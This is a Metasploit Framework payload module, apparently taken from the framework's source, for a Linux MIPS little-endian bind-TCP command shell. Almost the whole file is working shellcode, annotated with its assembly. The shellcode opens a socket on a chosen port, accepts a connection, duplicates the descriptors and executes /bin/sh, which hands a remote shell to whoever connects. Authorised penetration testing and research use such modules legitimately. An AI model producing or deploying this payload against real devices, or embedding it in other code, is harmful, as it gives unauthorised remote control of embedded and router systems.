##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => 'Vlatko Kosturjak',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' => {} ,
          'Payload' => ''
        })
    )
  end

  def generate
    if !datastore['LPORT']
      return super
    end

    port = Integer(datastore['LPORT'])
    port = [port].pack("n").unpack("cc");

    # based on vaicebine at gmail dot com shellcode
    # and scut paper Writing MIPS/Irix shellcode
    shellcode =
    "\xe0\xff\xbd\x27" + #     addiu   sp,sp,-32
    "\xfd\xff\x0e\x24" + #     li      t6,-3
    "\x27\x20\xc0\x01" + #     nor     a0,t6,zero
    "\x27\x28\xc0\x01" + #     nor     a1,t6,zero
    "\xff\xff\x06\x28" + #     slti    a2,zero,-1
    "\x57\x10\x02\x24" + #     li      v0,4183 ( __NR_socket )
    "\x0c\x01\x01\x01" + #     syscall
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
    "\xef\xff\x0e\x24" + #     li      t6,-17
    "\x27\x70\xc0\x01" + #     nor     t6,t6,zero
    port.pack("C2") + "\x0d\x24" +  #     li      t5,0xFFFF (port)
    "\x04\x68\xcd\x01" + #     sllv    t5,t5,t6
    "\xff\xfd\x0e\x24" + #     li      t6,-513
    "\x27\x70\xc0\x01" + #     nor     t6,t6,zero
    "\x25\x68\xae\x01" + #     or      t5,t5,t6
    "\xe0\xff\xad\xaf" + #     sw      t5,-32(sp)
    "\xe4\xff\xa0\xaf" + #     sw      zero,-28(sp)
    "\xe8\xff\xa0\xaf" + #     sw      zero,-24(sp)
    "\xec\xff\xa0\xaf" + #     sw      zero,-20(sp)
    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\xef\xff\x0e\x24" + #     li      t6,-17
    "\x27\x30\xc0\x01" + #     nor     a2,t6,zero
    "\xe0\xff\xa5\x23" + #     addi    a1,sp,-32
    "\x49\x10\x02\x24" + #     li      v0,4169 ( __NR_bind )A
    "\x0c\x01\x01\x01" + #     syscall
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\x01\x01\x05\x24" + #     li      a1,257
    "\x4e\x10\x02\x24" + #     li      v0,4174 ( __NR_listen )
    "\x0c\x01\x01\x01" + #     syscall
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\xff\xff\x05\x28" + #     slti    a1,zero,-1
    "\xff\xff\x06\x28" + #     slti    a2,zero,-1
    "\x48\x10\x02\x24" + #     li      v0,4168 ( __NR_accept )
    "\x0c\x01\x01\x01" + #     syscall
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\xfd\xff\x0f\x24" + #     li      t7,-3
    "\x27\x28\xe0\x01" + #     nor     a1,t7,zero
    "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
    "\x0c\x01\x01\x01" + #     syscall
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\x01\x01\x05\x28" + #     slti    a1,zero,0x0101
    "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
    "\x0c\x01\x01\x01" + #     syscall
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\x25\x20\x10\x02" + #     or      a0,s0,s0
    "\xff\xff\x05\x28" + #     slti    a1,zero,-1
    "\xdf\x0f\x02\x24" + #     li      v0,4063 ( __NR_dup2 )
    "\x0c\x01\x01\x01" + #     syscall
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\x50\x73\x06\x24" + #     li      a2,0x7350
    "\xff\xff\xd0\x04" + # LB: bltzal  a2,LB
    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
    "\xff\xff\x06\x28" + #     slti    a2,zero,-1
    "\xc7\xff\x0f\x24" + #     li      t7,-57
    "\x27\x78\xe0\x01" + #     nor     t7,t7,zero
    "\x21\x20\xef\x03" + #     addu    a0,ra,t7
    "\xf0\xff\xa4\xaf" + #     sw      a0,-16(sp)
    "\xf4\xff\xa0\xaf" + #     sw      zero,-12(sp)
    "\xf7\xff\x0e\x24" + #     li      t6,-9
    "\x27\x70\xc0\x01" + #     nor     t6,t6,zero
    "\x21\x60\xef\x03" + #     addu    t4,ra,t7
    "\x21\x68\x8e\x01" + #     addu    t5,t4,t6
    "\xff\xff\xa0\xad" + #     sw      zero,-1(t5)
    "\xf0\xff\xa5\x23" + #     addi    a1,sp,-16
    "\xab\x0f\x02\x24" + #     li      v0,4011 ( __NR_execve )
    "\x0c\x01\x01\x01" + #     syscall
    "/bin/sh"
  end

end
